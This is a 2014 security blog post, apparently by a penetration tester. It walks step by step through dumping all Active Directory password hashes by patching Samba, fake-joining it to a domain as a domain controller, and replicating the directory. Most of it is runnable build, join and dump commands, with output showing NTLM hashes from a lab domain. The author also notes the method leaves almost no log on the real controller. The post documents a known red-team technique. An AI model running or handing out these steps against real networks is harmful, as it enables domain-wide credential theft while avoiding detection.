<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Dumping NTDS.dit domain hashes using Samba // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.17" />

  <meta property="og:title" content="Dumping NTDS.dit domain hashes using Samba" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/post/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	

	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot_small.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/start/">Start in Infosec</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/projects/">Projects</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="http://pwnwiki.io">PwnWiki</a></li><br>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    
    <br>
    <h2 class="brand-tagline">Support Me</h2>
    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://paypal.me/mubix/10">Paypal Donation</a></li><br>
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://patreon.com/mubix">Patreon Subscription</a></li>
      </ul>
    </nav>

  </div>
</div>

	
	

    <div class="content pure-u-1 pure-u-md-3-4">
		<a name="top"></a>
		

		
			
	    
  		<section class="post">
            <h1 class="post-title">
              <a href="/post/2014/2014-05-14-dumping-ntds-dot-dit-domain-hashes-using-samba/">Dumping NTDS.dit domain hashes using Samba</a>
            </h1>
            <h3 class="post-subtitle">
            	
            </h3>
            
            	<span class="post-date">
                	<span class="post-date-day"><sup>14</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2014</span>
            	</span>
            	
            
            	
            

			
			
				<div class="post-categories">
				
					<a class="post-category post-category-samba" href="https://room362.com//categories/samba">samba</a>
				
					<a class="post-category post-category-ntds.dit" href="https://room362.com//categories/ntds.dit">ntds.dit</a>
				
					<a class="post-category post-category-passwords" href="https://room362.com//categories/passwords">passwords</a>
				
				</div>
			

			

			

            <p>So there was this blog post that talking about a number of ways to dump windows credentials by <a href="https://twitter.com/lanjelot">@lanjelot</a> [definitly someone to follow] - here: <a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a> and at the very bottom of this post it says &ldquo;<strong>AD Replication (EXPERIMENTAL)</strong>&ldquo;</p>

<p>What it boils down to is if you can position a system that can do DNS resolution to the target domain, and perform some other UDP traffic, you can fake join a samba server you control to a domain and it <strong><em>doesn&rsquo;t require code execution in any way on the domain controller</em></strong>.</p>

<p>Notice: I am not doing this on a Kali Linux box, there is already an install of Samba there and I didn&rsquo;t want to try uninstalling or modifying the one installed.</p>

<p>First, you need this patch:</p>

<p><code>wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt</code></p>

<p>and Samba 4.1.0</p>

<p><code>wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz</code></p>

<p>You will probably also require some dependencies to be installed:</p>

<p><code>apt-get install python2.7-dev python-samba libacl1-dev build-essential libldap2-dev libkrb5-dev attr</code></p>

<p>Since the patch is kinda wonky, you need to make a <code>src</code> directory and extract samba into there first. Then apply the patch in whatever directory is above src</p>

<pre><code>mkdir src
mv samba-4.1.0.tar.gz src/
cd src/
tar zxvf samba-4.1.0.tar.gz
cd /root/
</code></pre>

<p>So it would look like this:</p>

<pre><code>samba-4.1.0_replication-only-patch.txt
src/
src/samba-4.1.0/
</code></pre>

<p>then run <code>patch -p0 &lt; samba-4.1.0_replication-only-patch.txt</code></p>

<pre><code>cd ./src/samba-4.1.0/
./configure
make
make install
</code></pre>

<p>Prepare the box:</p>

<pre><code>rm -rf /var/lib/samba; mkdir /var/lib/samba; rm -f /etc/samba/smb.conf
</code></pre>

<p>Next you need to make sure you are resolving correctly (if you can&rsquo;t resolve the SRV record <code>_ldap._tcp.sittingduck.info</code> (sittingduck.info being the domain) then this isn&rsquo;t going to work.</p>

<pre><code>echo nameserver 192.168.92.37 &gt; /etc/resolv.conf # this is the IP address of the DC
</code></pre>

<p>Then start the clone:</p>

<pre><code>/usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
</code></pre>

<p>Looks like this:</p>

<pre><code>root@sambabox:~/src/samba-4.1.0# /usr/local/samba/bin/samba-tool domain join sittingduck.info DC -U sittingduck\\administrator
Finding a writeable DC for domain 'sittingduck.info'
Found DC 2K8DC.sittingduck.info
Password for [SITTINGDUCK\administrator]:
workgroup is SITTINGDUCK
realm is sittingduck.info
Calling bare provision
No IPv6 address will be assigned
Provision OK for domain DN DC=sittingduck,DC=info
Starting replication
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
Schema-DN[CN=Schema,CN=Configuration,DC=sittingduck,DC=info] objects[1521] linked_values[0]
Analyze and apply schema objects
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[402] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[804] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1206] linked_values[0]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1608] linked_values[1]
Partition[CN=Configuration,DC=sittingduck,DC=info] objects[1614] linked_values[11]
Replicating critical objects from the base DN of the domain
Partition[DC=sittingduck,DC=info] objects[100] linked_values[24]
Partition[DC=sittingduck,DC=info] objects[353] linked_values[27]
Done with always replicated NC (base, config, schema)
Committing SAM database
descriptor_sd_propagation_recursive: DC=DomainDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
descriptor_sd_propagation_recursive: DC=ForestDnsZones,DC=sittingduck,DC=info not found under DC=sittingduck,DC=info
Joined domain SITTINGDUCK (SID S-1-5-21-3147519476-3247671789-820278723) as a DC

</code></pre>

<p>Then to get the hashes:</p>

<pre><code>root@sambabox:~# /usr/local/samba/bin/pdbedit -L -w
2K8DC$:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:CB14F1166BBE1749AC0FB40240C5DC30:[S          ]:LCT-530FC425:
Administrator:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[U          ]:LCT-531006A4:
krbtgt:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:F2EE6AB6F40810169E0E46B126CEFBEF:[DU         ]:LCT-530FC3FF:
nobody:65534:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:[U          ]:LCT-00000000:
jdoe:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-530FC5FF:
uber:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:88E4D9FABAECF3DEC18DD80905521B29:[UX         ]:LCT-53101261:

</code></pre>

<p>Or you can do it with history:</p>

<pre><code>root@sambabox:~# python samba-pwdump.py /usr/local/samba/private/sam.ldb.d/DC\=SITTINGDUCK\,DC\=INFO.ldb -history
SAMBACLONE$:1104:::::
2K8DC$:1000::cb14f1166bbe1749ac0fb40240c5dc30:::
Administrator:500::88e4d9fabaecf3dec18dd80905521b29:::
krbtgt:502::f2ee6ab6f40810169e0e46b126cefbef:::
Guest:501:::::
jdoe:1103::88e4d9fabaecf3dec18dd80905521b29:::
uber:1105::88e4d9fabaecf3dec18dd80905521b29:::
uber_history0:1105:444d1edcad01ae08f49f073e12e8cc14:88e4d9fabaecf3dec18dd80905521b29:::
</code></pre>

<p>Game over. The great thing is that it never actually shows up as a joined box in the domain, and as far as I can tell the only log on the real DC is the login success of a domain admin. Plus one of the huge benefits to this method is that once you have the database Samba makes it really easy to query information like group membership or users info after the fact, not just hashes.</p>

	
			

			

			
				<div class="paging">
					<span class="paging-label">More Reading</span>
					
					<div class="paging-newer">
						<span class="dark-red">Newer</span><span class="decorative-marker">//</span>
						<a class="paging-link" href="/post/2014/2014-05-20-ccdc-red-teamers-creed/">CCDC Red Teamer&#39;s Creed</a>
		            </div>
		            

					
					<div class="paging-older">
						<span class="dark-red">Older</span><span class="decorative-marker">//</span>
			            <a class="paging-link" href="/post/2014/2014-04-19-executing-code-via-smb-without-psexec/">Executing code via SMB / DCOM without PSEXEC</a>
		            </div>
		            
	            </div>
            
          </section>
          
          	<div id="disqus_thread"></div>
<script type="text/javascript">

(function() {
    
    
    if (window.location.hostname == "localhost")
        return;
    if (window.location.hostname == "127.0.0.1")
        return;
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    var disqus_shortname = 'room362';
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          
        
      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
	

	

  
</body>
</html>
